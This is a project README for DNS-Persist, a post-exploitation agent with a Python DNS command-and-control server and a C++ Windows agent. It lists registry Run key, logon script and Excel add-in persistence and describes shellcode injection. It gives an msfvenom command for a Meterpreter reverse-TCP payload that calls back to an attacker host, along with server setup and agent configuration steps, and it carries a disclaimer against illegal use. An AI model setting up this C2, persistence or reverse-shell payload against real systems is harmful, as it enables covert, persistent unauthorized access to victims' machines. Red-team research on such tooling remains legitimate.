# DNS-Persist
DNS-Persist is a post-exploitation agent which uses DNS for command and control. The server-side code is in Python and the agent is coded in C++. This is the first version, more features and improvements will be made in the future.

## Getting Started
### Author
0x09AL - https://twitter.com/0x09al
### Disclaimer
DO NOT USE THIS SOFTWARE FOR ILLEGALL PURPOSES.

THE AUTHOR DOES NOT KEEP ANY RESPONSIBILITY FOR ANY MISUSE OF THE CODE PROVIDED HERE.

## Did I reinvent the wheel ?
There are a lot of great work on DNS C2 but I created this software to be more focused on the persistence part. I'm no expert in C++ and this is my first "real program" in C++ (so expect some cringe worthy code). 

Suggestions about features and improvements are open.

## Architecture

This software is splitted in 2 - parts.
1. DNS server
2. Agent

![alt text](https://raw.githubusercontent.com/0x09AL/DNS-Persist/master/images/Picture-5.png "Architecture")

## Features
### Persistence mechanisms
This version has only 3 persistence mechanisms. More will be added later.
1. LogonScript persistence.
2. RunKey persistence.
3. Excel Addin persistence.

### Shellcode Injection
This version supports injection of 32-bit shellcode. The shellcode gets executed in a new thread in the same process, so crashing shellcode or invalid one will also crash the agent. Avoid NULL bytes on the shellcode.

#### Shellcode generation example
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port EXITFUNC=thread -b "\x00" -f hex -o /tmp/shellcode.hex
```

## TODO LIST
1. Add encryption.  **This version does not have any encryption so take your own risks when using it.**
2. Add more persistence mechanisms.
3. Agent in different programming languages.

## Installation & Usage
### Server side
```
pip install dnslib
git clone https://github.com/0x09AL/DNS-Persist
python server.py
```
By default a DNS server on port 53 will be started. You can change that on the server.py file.

### Agent
I used Visual Studio 2010 to code the agent so importing and compiling it should be fairly easy.

Keep in mind to change the HOST variable in Declarations.h, to match your DNS server IP. 

I did it this way because you do not need to buy a domain name.

```
#define HOST XXX.xxx.XXX.xxx
```

## Screenshots
1. Picture-1
![alt text](https://raw.githubusercontent.com/0x09AL/DNS-Persist/master/images/Picture-1.png "Picture-1")

2. Picture-2
![alt text](https://raw.githubusercontent.com/0x09AL/DNS-Persist/master/images/Picture-2.png "Picture-2")

3. Picture-3
![alt text](https://raw.githubusercontent.com/0x09AL/DNS-Persist/master/images/Picture-3.png "Picture-3")

4. Picture-4
![alt text](https://raw.githubusercontent.com/0x09AL/DNS-Persist/master/images/Picture-4.png "Picture-4")

5. Picture-5
![alt text](https://raw.githubusercontent.com/0x09AL/DNS-Persist/master/images/Picture-5.png "Picture-5")

